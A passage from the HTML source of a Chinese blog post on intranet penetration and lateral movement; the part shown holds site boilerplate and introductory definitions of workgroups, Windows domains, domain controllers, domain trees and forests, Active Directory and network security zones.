@@ -1,0 +1,2269 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="郁涛丶">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="郁涛丶">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="GitHub：https:&#x2F;&#x2F;github.com&#x2F;Ghostasky&#x2F;IntranetPenetrationLearn 给个star吧QAQ [toc] 1.名词解释工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内权限等 工作组将不同的计算机按功能列入到不同的工作组中。工作组没有集中管理的作用，工作组中所有的计算机都是对等的。工作组不受密码保护。一个账户只能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透&amp;横向移动&amp;····">
+<meta property="og:url" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="郁涛丶&#39;s Blog">
+<meta property="og:description" content="GitHub：https:&#x2F;&#x2F;github.com&#x2F;Ghostasky&#x2F;IntranetPenetrationLearn 给个star吧QAQ [toc] 1.名词解释工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内权限等 工作组将不同的计算机按功能列入到不同的工作组中。工作组没有集中管理的作用，工作组中所有的计算机都是对等的。工作组不受密码保护。一个账户只能">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161917242-744398688.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161939610-1988580593.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121163434689-855209408.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174256681.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174530574.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174748182.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182106728.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182303660.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316183849046.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316184043460.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606872766_5fc6eebe0e0d42db8c48c.png!small">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876288_5fc6fc80d5cb1db233661.png!small">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876319_5fc6fc9f5e6fcab88b21d.png!small">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/733013-20170706233246425-1384840260.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175559094.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175921095.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317180028774.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182421455.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182701533.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183428519.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183743360.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183912489.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184120741.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184213265.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093645_6081688d6fe4ca32a240d.png!small">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093657_60816899201be08a4b1ab.png!small">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141047308.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141844900.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319143430449.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318183012610.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185354157.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185531211.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319161231967.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160157984.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160656572.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165203798.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165338212.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165549388.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200338986.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200449833.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318202007613.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318194110678.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191443842.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191719021.png">
+<meta property="og:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319170505083.png">
+<meta property="article:published_time" content="2022-03-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-19T09:37:16.437Z">
+<meta property="article:author" content="郁涛丶">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161917242-744398688.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>内网渗透&amp;横向移动&amp;···· · 郁涛丶&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=202107" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=202107" as="style">
+    <link rel="stylesheet" href="/css/mobile.css?v=202107" media="(max-width: 980px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=202107" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=202107" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <script src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/js/all.min.js" data-auto-replace-svg="nest"></script>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>郁涛丶's Blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">郁涛丶&#39;s Blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">内网渗透&横向移动&····</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- dark mode -->
+        <script src="/scripts/dark.js"></script>
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                内网渗透&横向移动&····
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="内网">内网</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">11.5k</span>阅读时长: <span class="post-count reading-time">46 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/03/19</span>
+                    <!-- busuanzi -->
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+        
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>GitHub：<a target="_blank" rel="noopener" href="https://github.com/Ghostasky/IntranetPenetrationLearn">https://github.com/Ghostasky/IntranetPenetrationLearn</a></p>
+<p>给个star吧QAQ</p>
+<p>[toc]</p>
+<h1 id="1-名词解释"><a href="#1-名词解释" class="headerlink" title="1.名词解释"></a>1.名词解释</h1><p>工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内权限等</p>
+<h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>将不同的计算机按功能列入到不同的工作组中。工作组没有集中管理的作用，工作组中所有的计算机都是对等的。工作组不受密码保护。一个账户只能登陆到一台计算机。每一台计算机都在本地存储用户的帐户。</p>
+<p>工作组的正规解释：在一个大的单位内，可能有成百上千台电脑互连组成局域网，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中。</p>
+<p>每台计算机都是对等的，<code>a</code>机器不能登录<code>b</code>机器。</p>
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/angerfire/144123">域，域树，域林，根域</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11906772.html">内网基础知识</a></p>
+<p>域(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
+<p>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p>
+<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。<br>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
+<h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
+<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
+<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
+<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
+<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161917242-744398688.png" alt="img"></p>
+<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161939610-1988580593.png" alt="img"></p>
+<h3 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h3><p>DNS域名服务器（Domain Name Server）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。</p>
+<p>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</p>
+<p>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p>
+<h3 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h3><p>域环境中提供目录服务的组件。</p>
+<p>就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p>
+<h3 id="AD与DC的区别"><a href="#AD与DC的区别" class="headerlink" title="AD与DC的区别"></a>AD与DC的区别</h3><p>把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p>
+<h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121163434689-855209408.png" alt="img"></p>
+<p>1.内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区）</p>
